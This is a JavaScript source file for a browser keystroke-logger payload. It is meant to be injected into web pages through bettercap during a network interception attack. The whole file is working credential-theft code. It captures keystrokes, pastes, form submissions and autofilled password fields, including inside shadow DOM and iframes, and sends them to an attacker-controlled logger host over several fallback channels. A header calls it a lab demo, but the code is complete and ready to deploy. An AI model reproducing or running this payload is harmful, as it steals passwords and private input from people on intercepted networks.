/* bettercap.js — universal live keystroke logger payload (browser side).
 *
 * LAB / CLASSROOM DEMO ONLY — only use on your own network, your own devices,
 * with explicit consent from everyone involved. Wipe run/*.log after class.
 *
 * What it does (same as portal_server.py __portal_sensor v2):
 *   captures keydown/input/change/paste/cut/focus/submit on
 *   INPUT/TEXTAREA/SELECT/[contenteditable], including late-rendered
 *   React/Next.js fields (MutationObserver + shadow-DOM piercing + autofill
 *   poll), tags WHERE the victim types (page URL+title, field label, css path)
 *   and streams batched per-keypress events to your logger.
 *
 * How it is delivered:
 *   bettercap's jsinject wraps this file and injects it into HTTP pages:
 *     sudo bettercap -caplet bettercap.cap
 *   (see bettercap.cap in this folder; edit LOGGER below first)
 *
 * Exfil strategy (works from ANY site, not just your portal):
 *   1) POST batches to LOGGER (__portal_keys -> /keys -> /beacon) using
 *      text/plain + no-cors + keepalive, so no CORS preflight is needed and
 *      navigation never cancels the submit-tail (sendBeacon flush).
 *   2) On submit, ALSO fires a tiny same-origin GET (/__bc_keys?d=...) so the
 *      credentials show up in bettercap's own HTTP log even if the logger
 *      box is unreachable.
 *   3) Failed batches are re-queued in memory (+ localStorage spill per
 *      origin) and flushed on the next page.
 *
 * NOTE on HTTPS: stock http.proxy only sees HTTP. HTTPS pages need
 * https.proxy + your lab CA on the demo devices (see bettercap.cap).
 * An https:// page can NOT exfiltrate to an http:// logger (browsers block
 * mixed content) — for full HTTPS coverage serve the logger over HTTPS too
 * or rely on the same-origin beacon in bettercap's log.
 */
(function () { try {
/* ================= CONFIG — EDIT THIS ================= */
var LOGGER = "http://192.168.4.1"; /* your logger box (portal_server :80) */
/* ======================================================= */

var CID = null;
try { CID = localStorage.getItem("__bc_cid"); } catch (e) {}
if (!CID) { CID = "b" + Math.random().toString(36).slice(2, 10);
  try { localStorage.setItem("__bc_cid", CID); } catch (e) {} }
var seq = 0, Q = [], TIMER = null, CACHE = {};
var EPS = [LOGGER + "/__portal_keys", LOGGER + "/keys", LOGGER + "/beacon"];

function pg() { try { return location.href.slice(0, 300); } catch (e) { return ""; } }
function ti() { try { return document.title.slice(0, 120); } catch (e) { return ""; } }
function css(el) { try {
  var p = [], n = el;
  for (var i = 0; i < 4 && n && n.tagName; i++) {
    var s = n.tagName.toLowerCase();
    if (n.id) s += "#" + String(n.id).slice(0, 30);
    else if (n.name) s += '[name="' + String(n.name).slice(0, 30) + '"]';
    else if (n.className && n.className.length && n.className.slice)
      s += "." + String(n.className).split(/\s+/)[0].slice(0, 20);
    p.unshift(s); n = n.parentElement;
  }
  return p.join(">").slice(0, 140);
} catch (e) { return ""; } }
function lbl(el) { try {
  var a = el.getAttribute && (el.getAttribute("aria-label") || el.getAttribute("data-testid"));
  if (a) return String(a).slice(0, 60);
  if (el.name) return String(el.name).slice(0, 60);
  if (el.id) {
    var l = null;
    try { l = document.querySelector('label[for="' + el.id.replace(/"/g, "") + '"]'); } catch (e) {}
    if (l && l.innerText) return l.innerText.trim().slice(0, 60);
    return String(el.id).slice(0, 60);
  }
  if (el.placeholder) return String(el.placeholder).slice(0, 60);
  if (el.autocomplete && el.autocomplete !== "off") return String(el.autocomplete).slice(0, 60);
  return ((el.type || el.tagName || "field") + "").toLowerCase().slice(0, 40);
} catch (e) { return "field"; } }
function val(el) { try {
  if (!el) return "";
  if (el.isContentEditable) return (el.innerText || "").slice(0, 2000);
  if (el.tagName === "SELECT") return (el.value || "").slice(0, 200);
  if ("checked" in el && (el.type === "checkbox" || el.type === "radio"))
    return el.checked ? "[checked]" : "[unchecked]";
  return (el.value == null ? "" : String(el.value)).slice(0, 2000);
} catch (e) { return ""; } }
function fld(el) { try {
  var f = null;
  if (el && el.form) { try { f = (el.form.getAttribute("action") || "").slice(0, 120); } catch (e) {} }
  return { f: lbl(el), t: ((el.type || el.tagName || "") + "").toLowerCase().slice(0, 20),
           p: css(el), form: f };
} catch (e) { return { f: "field", t: "", p: "", form: null }; } }

function stash(batch) { /* re-queue failed batch (memory + per-origin spill) */
  try {
    for (var i = batch.events.length - 1; i >= 0; i--) Q.unshift(batch.events[i]);
    try {
      var old = [];
      try { old = JSON.parse(localStorage.getItem("__bc_q") || "[]"); } catch (e) { old = []; }
      old = batch.events.concat(old).slice(0, 200);
      localStorage.setItem("__bc_q", JSON.stringify(old));
    } catch (e) {}
  } catch (e) {}
}
function unspill() {
  try {
    var old = JSON.parse(localStorage.getItem("__bc_q") || "[]");
    if (old && old.length) {
      for (var i = old.length - 1; i >= 0; i--) Q.unshift(old[i]);
      localStorage.setItem("__bc_q", "[]");
    }
  } catch (e) {}
}
function push(type, el, key) { try {
  var F = fld(el), v = val(el);
  Q.push({ seq: ++seq, t: Date.now(), type: type, key: (key == null ? "" : String(key)).slice(0, 40),
           value: v, field: F.f, ftype: F.t, path: F.p, form: F.form, page: pg(), title: ti() });
  if (Q.length >= 15) flush(false);
} catch (e) {} }
/* text/plain + no-cors => simple request, no CORS preflight, works cross-origin */
function postText(url, body, beacon) {
  try {
    if (beacon && navigator.sendBeacon) {
      try { if (navigator.sendBeacon(url, new Blob([body], { type: "text/plain" }))) return true; }
      catch (e) {}
    }
    fetch(url, { method: "POST", mode: "no-cors", credentials: "omit",
      headers: { "Content-Type": "text/plain" }, body: body, keepalive: true
    }).catch(function () {});
    return false;
  } catch (e) { return false; }
}
function flush(sync) { try {
  if (!Q.length) return;
  var batch = { clientId: CID, page: pg(), title: ti(), events: Q.splice(0, 100) };
  var body = JSON.stringify(batch);
  if (sync) {
    for (var i = 0; i < EPS.length; i++) {
      try { if (navigator.sendBeacon && navigator.sendBeacon(EPS[i], new Blob([body], { type: "text/plain" }))) return; } catch (e) {}
    }
    try { fetch(EPS[0], { method: "POST", mode: "no-cors", credentials: "omit",
      headers: { "Content-Type": "text/plain" }, body: body, keepalive: true }).catch(function () { stash(batch); });
    } catch (e) { stash(batch); }
    return;
  }
  if (TIMER) { clearTimeout(TIMER); TIMER = null; }
  (function tryEp(n) {
    if (n >= EPS.length) { stash(batch); return; }
    try {
      fetch(EPS[n], { method: "POST", mode: "no-cors", credentials: "omit",
        headers: { "Content-Type": "text/plain" }, body: body, keepalive: true
      }).then(function () {}).catch(function () { tryEp(n + 1); });
    } catch (e) { tryEp(n + 1); }
  })(0);
} catch (e) {} }
function sched() { if (TIMER) return; TIMER = setTimeout(function () { TIMER = null; flush(false); }, 700); }

/* same-origin submit beacon: shows up in bettercap's HTTP log even if LOGGER is down */
function proxyBeacon() { try {
  var parts = [], els = [];
  try { els = document.querySelectorAll("input,textarea,select"); } catch (e) {}
  for (var i = 0; i < els.length && i < 12; i++) {
    try {
      var n = lbl(els[i]), v = val(els[i]);
      if (v && v !== "[unchecked]") parts.push(n + "=" + v.slice(0, 80));
    } catch (e) {}
  }
  if (!parts.length) return;
  var d = encodeURIComponent(parts.join(" | ").slice(0, 1200));
  try { new Image().src = "/__bc_keys?d=" + d + "&p=" + encodeURIComponent(pg().slice(0, 120)); }
  catch (e) {}
} catch (e) {} }

function hook(root) { try {
  if (!root || root.__bc_hooked) return; root.__bc_hooked = 1;
  var opts = true;
  root.addEventListener("keydown", function (e) { try {
    var el = e.target; if (!el) return;
    var tg = el.tagName || "";
    if (tg === "INPUT" || tg === "TEXTAREA" || tg === "SELECT" || el.isContentEditable)
      { push("key", el, e.key); sched(); }
  } catch (x) {} }, opts);
  root.addEventListener("input", function (e) { try {
    var el = e.target; if (!el) return;
    var tg = el.tagName || "";
    if (tg === "INPUT" || tg === "TEXTAREA" || tg === "SELECT" || el.isContentEditable) {
      if (el.type === "submit" || el.type === "button" || el.type === "file") return;
      push("input", el, ""); sched();
    }
  } catch (x) {} }, opts);
  root.addEventListener("change", function (e) { try { if (e.target) { push("change", e.target, ""); flush(false); } } catch (x) {} }, opts);
  root.addEventListener("paste", function (e) { try { push("paste", e.target, ""); sched(); } catch (x) {} }, opts);
  root.addEventListener("cut", function (e) { try { push("cut", e.target, ""); sched(); } catch (x) {} }, opts);
  root.addEventListener("focusin", function (e) { try { push("focus", e.target, ""); sched(); } catch (x) {} }, opts);
  root.addEventListener("submit", function (e) { try {
    var f = e.target;
    if (f && f.querySelectorAll) {
      var els = f.querySelectorAll("input,textarea,select");
      for (var i = 0; i < els.length; i++) { try { push("submit", els[i], ""); } catch (x) {} }
    }
    proxyBeacon(); flush(true);
  } catch (x) { try { proxyBeacon(); flush(true); } catch (y) {} } }, opts);
} catch (e) {} }

function pierce() { try {
  var all = document.querySelectorAll("*");
  for (var i = 0; i < all.length; i++) { try { if (all[i].shadowRoot) hook(all[i].shadowRoot); } catch (e) {} }
  try { for (var f = 0; f < window.frames.length; f++) { try { var d = window.frames[f].document; if (d) hook(d); } catch (e) {} } } catch (e) {}
} catch (e) {} }

function boot() {
  try { hook(document); } catch (e) {}
  try { if (document.documentElement) hook(document.documentElement); } catch (e) {}
  try { pierce(); unspill(); } catch (e) {}
  try {
    if (window.MutationObserver && document.documentElement)
      new MutationObserver(function () { try { pierce(); } catch (e) {} })
        .observe(document.documentElement, { childList: true, subtree: true });
  } catch (e) {}
}
try {
  if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", boot);
  else boot();
  window.addEventListener("load", function () { try { pierce(); flush(false); } catch (e) {} });
} catch (e) { try { boot(); } catch (x) {} }

setInterval(function () { try { /* autofill / password-manager sweep */
  var els = document.querySelectorAll("input,textarea,select,[contenteditable]");
  for (var i = 0; i < els.length && i < 60; i++) {
    var el = els[i];
    if (el.type === "password" || el.type === "email" || el.type === "text" || el.tagName === "TEXTAREA") {
      try {
        var k = css(el), v = val(el);
        if (CACHE[k] !== undefined && CACHE[k] !== v && v) push("poll", el, "");
        CACHE[k] = v;
      } catch (e) {}
    }
  }
  pierce();
} catch (e) {} }, 2500);
document.addEventListener("visibilitychange", function () { if (document.hidden) flush(true); });
window.addEventListener("pagehide", function () { flush(true); });
window.addEventListener("beforeunload", function () { flush(true); });
setInterval(function () { flush(false); }, 4000);
} catch (e) {} })();
